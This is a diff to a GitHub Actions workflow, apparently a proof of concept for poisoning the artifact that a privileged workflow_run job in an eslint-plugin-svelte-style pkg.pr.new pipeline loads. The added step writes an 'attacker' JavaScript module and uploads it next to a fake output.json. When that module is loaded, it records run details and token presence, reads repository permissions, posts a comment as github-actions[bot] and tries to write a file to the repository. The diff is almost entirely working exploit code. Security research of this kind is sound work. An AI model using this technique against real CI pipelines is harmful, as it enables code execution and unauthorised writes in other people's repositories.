@@ -2,27 +2,92 @@ name: Publish to pkg.pr.new
 on:
   pull_request:
     branches: [main]
-  push:
-    branches: [main]
-    tags: ['!**']
 
 permissions:
   contents: read
 
 jobs:
   build:
-    if: github.repository == 'PDFtoMark/gab-poc-eslint-pkgprnew'
     runs-on: ubuntu-latest
 
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      - name: Write output.json
+      - name: Stage poisoned output artifact
         run: |
+          mkdir -p tools
+          cat > tools/pkg.pr.new-comment.mjs <<'JS'
+          import fs from 'node:fs';
+
+          fs.writeFileSync(
+          	'pwned-marker.json',
+          	JSON.stringify(
+          		{
+          			module: 'attacker',
+          			cwd: process.cwd(),
+          			repository: process.env.GITHUB_REPOSITORY,
+          			event: process.env.GITHUB_EVENT_NAME,
+          			runId: process.env.GITHUB_RUN_ID,
+          			tokenInputPresent: Boolean(
+          				process.env['INPUT_GITHUB-TOKEN'] || process.env['INPUT_GITHUB_TOKEN']
+          			),
+          			ts: new Date().toISOString()
+          		},
+          		null,
+          		2
+          	)
+          );
+          console.log('ATTACKER-MODULE-TOP-LEVEL-RCE', process.cwd());
+
+          export default async function ({ github, context }) {
+          	try {
+          		const repo = await github.rest.repos.get({
+          			owner: context.repo.owner,
+          			repo: context.repo.repo
+          		});
+          		console.log(
+          			'ATTACKER-PERMS',
+          			JSON.stringify(repo.data.permissions),
+          			'private=' + repo.data.private
+          		);
+          	} catch (e) {
+          		console.log('ATTACKER-PERMS-FAILED', e.status, e.message);
+          	}
+
+          	try {
+          		const comment = await github.rest.issues.createComment({
+          			owner: context.repo.owner,
+          			repo: context.repo.repo,
+          			issue_number: 1,
+          			body: 'ATTACKER-COMMENT: arbitrary code ran in the privileged workflow_run workflow and can comment as github-actions[bot].'
+          		});
+          		console.log('ATTACKER-COMMENT-OK', comment.data.id);
+          	} catch (e) {
+          		console.log('ATTACKER-COMMENT-FAILED', e.status, e.message);
+          	}
+
+          	try {
+          		await github.rest.repos.createOrUpdateFileContents({
+          			owner: context.repo.owner,
+          			repo: context.repo.repo,
+          			path: 'attacker-write.txt',
+          			message: 'attacker write test',
+          			content: Buffer.from('test').toString('base64')
+          		});
+          		console.log('ATTACKER-CONTENTS-WRITE-OK');
+          	} catch (e) {
+          		console.log('ATTACKER-CONTENTS-WRITE-BLOCKED', e.status, e.message);
+          	}
+          }
+          JS
           cat > output.json <<'JSON'
           {"number": 1, "sha": "deadbeef", "packages": [{"name": "eslint-plugin-svelte", "url": "https://pkg.pr.new/eslint-plugin-svelte@deadbeef"}]}
           JSON
+          cat output.json
       - name: Upload output
         uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6.0.0
         with:
           name: output
-          path: ./output.json
+          path: |
+            output.json
+            tools/pkg.pr.new-comment.mjs
+          include-hidden-files: true
